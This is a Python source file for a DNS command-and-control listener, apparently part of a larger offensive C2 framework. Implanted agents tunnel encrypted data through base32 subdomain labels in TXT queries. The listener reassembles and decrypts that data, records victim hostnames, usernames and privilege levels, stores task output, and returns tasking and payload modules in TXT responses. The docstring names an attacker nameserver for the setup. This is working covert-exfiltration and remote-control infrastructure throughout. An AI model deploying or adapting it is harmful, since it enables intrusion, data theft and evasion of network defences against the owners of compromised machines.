"""
DNS C2 listener — authoritative DNS server for DNS-based exfiltration.

Agents encode C2 data as DNS queries:
  <seq_hex>.<b32_label1>.<b32_label2>.<c2_domain>  (TXT query)

The listener:
  1. Receives DNS queries
  2. Extracts base32-encoded data from subdomain labels
  3. Reassembles chunks by sequence number
  4. Processes reassembled packet as normal C2 traffic
  5. Returns response data in TXT records (base64-encoded)

Requires the C2 domain's NS record to point to this server:
  c2.example.com  NS  ns1.attacker.com
  ns1.attacker.com  A  <operator_ip>
"""

import asyncio
import base64
import logging
import struct
import threading
from typing import Optional
from uuid import UUID

import dns.message
import dns.name
import dns.rdatatype
import dns.rcode
import dns.rrset

try:
    import dns.asyncbackend
    import dns.asyncquery
except ImportError:
    pass

from .base import BaseListener
from ..core.session_manager import SessionManager, AgentSession
from ..core.task_manager import TaskManager
from ..core.events import event_bus, EventBus
from ..crypto import aes_gcm, key_exchange, nonce
from ..crypto.rsa import load_private_key, rsa_decrypt
from ..protocol.commands import (
    Command, TlvType, DEFAULT_MAGIC, HEADER_SIZE,
)
from ..protocol.tlv import (
    TlvBuilder, iter_tlv, find_tlv, find_tlv_string,
    find_tlv_uint32, find_tlv_uint8,
)
from ..protocol.packet import (
    pack_packet, unpack_packet_header, pack_command, unpack_command,
)
from ..logging.operator_logger import OperatorLogger

log = logging.getLogger(__name__)

# Base32 alphabet (RFC 4648, no padding)
B32_ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"


def base32_decode(data: str) -> bytes:
    """Decode base32 without padding."""
    data = data.upper()
    # Add padding for standard base64 decoder
    padding = (8 - len(data) % 8) % 8
    data += "=" * padding
    try:
        return base64.b32decode(data)
    except Exception:
        return b""


class DnsReassembler:
    """
    Reassembles chunked DNS data from multiple queries.
    Each query carries one chunk identified by a sequence number.
    Chunks are collected until the complete message is received.
    """

    def __init__(self):
        # Keyed by source IP → { "chunks": {seq: data}, "expected": int }
        self._sessions: dict[str, dict] = {}
        self._timeout_s = 30

    def add_chunk(
        self, source_ip: str, seq: int, data: bytes
    ) -> Optional[bytes]:
        """
        Add a chunk. Returns the reassembled message when all chunks
        are received (heuristic: when seq=0 comes in, it starts a new
        session; when a chunk has no more data, it's the last one).
        """
        if source_ip not in self._sessions:
            self._sessions[source_ip] = {"chunks": {}, "total_chunks": -1}

        session = self._sessions[source_ip]

        # If seq=0 and we already have data, start fresh
        if seq == 0 and session["chunks"]:
            session["chunks"] = {}

        session["chunks"][seq] = data

        return None  # We return data on explicit flush

    def flush(self, source_ip: str) -> Optional[bytes]:
        """
        Attempt to reassemble all collected chunks for a source IP.
        Called when we detect the last chunk (small chunk or explicit signal).
        """
        session = self._sessions.get(source_ip)
        if not session or not session["chunks"]:
            return None

        # Reassemble in sequence order
        chunks = session["chunks"]
        result = bytearray()
        for seq in sorted(chunks.keys()):
            result.extend(chunks[seq])

        # Clear session
        del self._sessions[source_ip]

        if not result:
            return None

        # base32 decode the reassembled data
        decoded = base32_decode(result.decode("ascii", errors="ignore"))
        return decoded if decoded else None


class DnsListener(BaseListener):
    """
    Authoritative DNS server for C2 communication.

    Listens for DNS queries on UDP port 53. Agents encode their
    C2 traffic as subdomains of the configured C2 domain.
    """

    def __init__(
        self,
        listener_id: int,
        c2_domain: str,
        host: str = "0.0.0.0",
        port: int = 53,
        session_manager: SessionManager = None,
        task_manager: TaskManager = None,
        logger: OperatorLogger = None,
        rsa_private_key_path: Optional[str] = None,
        magic: int = DEFAULT_MAGIC,
    ):
        super().__init__(listener_id, "DNS")
        self.c2_domain = c2_domain.lower().rstrip(".")
        self.host = host
        self.port = port
        self.session_manager = session_manager
        self.task_manager = task_manager
        self.logger = logger
        self.magic = magic

        self._rsa_private_key = None
        if rsa_private_key_path:
            from pathlib import Path
            p = Path(rsa_private_key_path)
            if p.exists():
                self._rsa_private_key = load_private_key(p)

        self._reassembler = DnsReassembler()
        self._pending_responses: dict[str, bytes] = {}
        self._transport = None
        self._protocol = None

    async def start(self):
        loop = asyncio.get_event_loop()

        # Create UDP server
        transport, protocol = await loop.create_datagram_endpoint(
            lambda: DnsProtocol(self),
            local_addr=(self.host, self.port),
        )
        self._transport = transport
        self._protocol = protocol
        self.running = True
        log.info(
            f"[*] DNS listener started on {self.host}:{self.port} "
            f"(domain: {self.c2_domain})"
        )

    async def stop(self):
        if self._transport:
            self._transport.close()
        self.running = False
        log.info(f"[*] DNS listener stopped (domain: {self.c2_domain})")

    def info(self) -> dict:
        return {
            "id": self.listener_id,
            "type": self.listener_type,
            "interface": self.host,
            "port": self.port,
            "status": "RUNNING" if self.running else "STOPPED",
            "domain": self.c2_domain,
        }

    def handle_query(
        self, query_name: str, source_ip: str
    ) -> list[str]:
        """
        Process a DNS query name, extract C2 data, return TXT record values.

        Query format: <seq_hex>.<b32_labels>.<c2_domain>
        Returns list of base64-encoded TXT record strings.
        """
        name_lower = query_name.lower().rstrip(".")

        # Check if this query is for our C2 domain
        if not name_lower.endswith(self.c2_domain):
            return []

        # Strip the C2 domain suffix to get the data labels
        prefix = name_lower[: -(len(self.c2_domain) + 1)]  # +1 for the dot
        if not prefix:
            return []

        labels = prefix.split(".")
        if len(labels) < 2:
            return []

        # First label is the sequence number (hex)
        try:
            seq = int(labels[0], 16)
        except ValueError:
            return []

        # Remaining labels contain base32-encoded data
        b32_data = "".join(labels[1:]).upper()

        # Add chunk to reassembler
        self._reassembler.add_chunk(source_ip, seq, b32_data.encode("ascii"))

        # Try to reassemble and process
        # Heuristic: if the data labels are shorter than max, this is the last chunk
        max_data_per_query = 63 * 3  # 3 labels × 63 chars
        is_last = len(b32_data) < max_data_per_query

        if is_last:
            packet = self._reassembler.flush(source_ip)
            if packet and len(packet) >= HEADER_SIZE:
                response = self._process_packet(packet)
                if response:
                    # Base64 encode response, split into TXT-sized chunks
                    b64_resp = base64.b64encode(response).decode("ascii")
                    # TXT records max 255 bytes per string
                    txt_records = []
                    for i in range(0, len(b64_resp), 250):
                        txt_records.append(b64_resp[i : i + 250])
                    return txt_records

        # Return empty TXT to acknowledge receipt
        return ["ok"]

    def _process_packet(self, packet: bytes) -> Optional[bytes]:
        """Process a complete C2 packet, return response packet."""
        magic, size, msg_id = unpack_packet_header(packet)
        if magic != self.magic:
            return None

        encrypted_payload = packet[HEADER_SIZE:size]
        if not encrypted_payload:
            return None

        agent_id, plaintext = self._decrypt_and_identify(encrypted_payload)
        if plaintext is None:
            return None

        cmd, body = unpack_command(plaintext)

        if cmd == Command.KEY_EXCHANGE_INIT:
            return self._handle_key_exchange(agent_id, body)
        elif cmd == Command.CHECKIN_REQUEST:
            return self._handle_checkin(agent_id, body)
        elif cmd == Command.TASK_RESULT:
            return self._handle_task_result(agent_id, body)
        elif cmd == Command.HEARTBEAT:
            return self._handle_heartbeat(agent_id)

        return None

    def _decrypt_and_identify(
        self, encrypted_payload: bytes
    ) -> tuple[Optional[str], Optional[bytes]]:
        for session in self.session_manager.all_sessions():
            if not session.encryption_key:
                continue
            try:
                plaintext = aes_gcm.decrypt(
                    session.encryption_key, encrypted_payload
                )
                return session.agent_id, plaintext
            except Exception:
                continue

        if self._rsa_private_key:
            try:
                plaintext = rsa_decrypt(
                    self._rsa_private_key, encrypted_payload
                )
                if len(plaintext) >= 16:
                    agent_id = UUID(bytes=plaintext[:16]).hex
                    inner = pack_command(
                        Command.KEY_EXCHANGE_INIT, plaintext[16:]
                    )
                    return agent_id, inner
            except Exception:
                pass

        return None, None

    def _handle_key_exchange(
        self, agent_id: str, body: bytes
    ) -> Optional[bytes]:
        if len(body) < 65:
            return None

        agent_pub_bytes = body[:65]
        server_priv, server_pub_bytes = key_exchange.generate_keypair()

        agent_id_bytes = (
            bytes.fromhex(agent_id)
            if len(agent_id) == 32
            else agent_id.encode()[:16]
        )
        session_key = key_exchange.derive_session_key(
            server_priv, agent_pub_bytes, salt=agent_id_bytes
        )

        session = self.session_manager.get(agent_id)
        if not session:
            session = AgentSession(agent_id=agent_id)
            session.c2_channel = "DNS"
            session.listener_id = self.listener_id
            self.session_manager.register(session)

        session.encryption_key = session_key
        session.peer_public_key = agent_pub_bytes
        session.nonce_manager = nonce.NonceManager(
            agent_id_prefix=agent_id_bytes[:4], is_server=True
        )
        session.update_last_seen()

        log.info(f"[+] DNS key exchange completed: {agent_id[:8]}")

        resp_plaintext = pack_command(
            Command.KEY_EXCHANGE_RESP, server_pub_bytes
        )
        nonce_bytes = session.nonce_manager.next_nonce()
        encrypted = aes_gcm.encrypt(
            session_key, nonce_bytes, resp_plaintext
        )
        return pack_packet(
            server_pub_bytes + encrypted, 0, self.magic
        )

    def _handle_checkin(
        self, agent_id: str, body: bytes
    ) -> Optional[bytes]:
        session = self.session_manager.get(agent_id)
        if not session:
            return None

        self._update_session(session, body)
        session.update_last_seen()

        tasks = self.task_manager.flush_pending(session)
        resp_body = TlvBuilder()
        for task in tasks:
            resp_body.add_uuid(
                TlvType.TASK_ID,
                bytes.fromhex(task.task_id.replace("-", ""))[:16],
            )
            resp_body.add_uint8(TlvType.TASK_TYPE, task.task_type)
            resp_body.add_string(TlvType.MODULE_NAME, task.module_name)
            if task.payload:
                resp_body.add_bytes(TlvType.TASK_PAYLOAD, task.payload)
            if task.arguments:
                resp_body.add_bytes(TlvType.TASK_ARGUMENTS, task.arguments)
            resp_body.add_uint32(TlvType.TASK_TIMEOUT, task.timeout_seconds)

        resp_plaintext = pack_command(
            Command.CHECKIN_RESPONSE, resp_body.build()
        )
        return self._encrypt_response(session, resp_plaintext)

    def _handle_task_result(
        self, agent_id: str, body: bytes
    ) -> Optional[bytes]:
        session = self.session_manager.get(agent_id)
        if not session:
            return None

        session.update_last_seen()
        task_id_bytes = find_tlv(body, TlvType.TASK_ID)
        result_data = find_tlv(body, TlvType.RESULT_OUTPUT) or b""
        status_byte = find_tlv_uint8(body, TlvType.RESULT_STATUS)

        if task_id_bytes:
            task_id = (
                UUID(bytes=task_id_bytes[:16]).hex
                if len(task_id_bytes) >= 16
                else task_id_bytes.hex()
            )
            task = session.active_tasks.get(task_id)
            if task:
                success = (
                    (status_byte == 0) if status_byte is not None else True
                )
                self.task_manager.mark_complete(
                    session, task, result_data, success
                )

        resp_plaintext = pack_command(Command.TASK_RESULT_ACK, b"")
        return self._encrypt_response(session, resp_plaintext)

    def _handle_heartbeat(self, agent_id: str) -> Optional[bytes]:
        session = self.session_manager.get(agent_id)
        if not session:
            return None
        session.update_last_seen()
        resp_plaintext = pack_command(Command.HEARTBEAT_ACK, b"")
        return self._encrypt_response(session, resp_plaintext)

    def _update_session(self, session: AgentSession, body: bytes):
        for entry in iter_tlv(body):
            t, v = entry.type, entry.value
            try:
                if t == TlvType.HOSTNAME:
                    session.hostname = v.decode("utf-8")
                elif t == TlvType.USERNAME:
                    session.username = v.decode("utf-8")
                elif t == TlvType.PID:
                    session.pid = struct.unpack("<I", v[:4])[0]
                elif t == TlvType.PPID:
                    session.ppid = struct.unpack("<I", v[:4])[0]
                elif t == TlvType.ARCH:
                    session.arch = "x64" if v[0] == 0x02 else "x86"
                elif t == TlvType.OS_VERSION:
                    session.os_version = v.decode("utf-8")
                elif t == TlvType.INTEGRITY:
                    levels = {
                        0: "LOW", 1: "MEDIUM", 2: "HIGH", 3: "SYSTEM",
                    }
                    session.integrity = levels.get(v[0], "UNKNOWN")
                elif t == TlvType.IS_ADMIN:
                    session.is_admin = bool(v[0])
                elif t == TlvType.PROCESS_NAME:
                    session.process_name = v.decode("utf-8")
                elif t == TlvType.DOTNET_VERSION:
                    session.dotnet_version = v.decode("utf-8")
                elif t == TlvType.AGENT_VERSION:
                    session.agent_version = v.decode("utf-8")
                elif t == TlvType.CWD:
                    session.cwd = v.decode("utf-8")
            except Exception:
                continue

    def _encrypt_response(
        self, session: AgentSession, plaintext: bytes
    ) -> bytes:
        nonce_bytes = session.nonce_manager.next_nonce()
        encrypted = aes_gcm.encrypt(
            session.encryption_key, nonce_bytes, plaintext
        )
        return pack_packet(encrypted, 0, self.magic)


class DnsProtocol(asyncio.DatagramProtocol):
    """asyncio UDP protocol for the DNS listener."""

    def __init__(self, listener: DnsListener):
        self.listener = listener

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data: bytes, addr: tuple):
        try:
            query = dns.message.from_wire(data)
        except Exception:
            return

        response = dns.message.make_response(query)
        response.flags |= dns.flags.AA  # Authoritative

        for question in query.question:
            qname = str(question.name).rstrip(".")
            qtype = question.rdtype

            if qtype == dns.rdatatype.TXT:
                source_ip = addr[0]
                txt_values = self.listener.handle_query(qname, source_ip)

                if txt_values:
                    rrset = response.find_rrset(
                        response.answer,
                        question.name,
                        question.rdclass,
                        dns.rdatatype.TXT,
                        create=True,
                    )
                    for txt_val in txt_values:
                        rrset.add(
                            dns.rdata.from_text(
                                question.rdclass,
                                dns.rdatatype.TXT,
                                f'"{txt_val}"',
                            ),
                            ttl=0,
                        )
                else:
                    response.set_rcode(dns.rcode.NXDOMAIN)
            else:
                response.set_rcode(dns.rcode.NXDOMAIN)

        self.transport.sendto(response.to_wire(), addr)
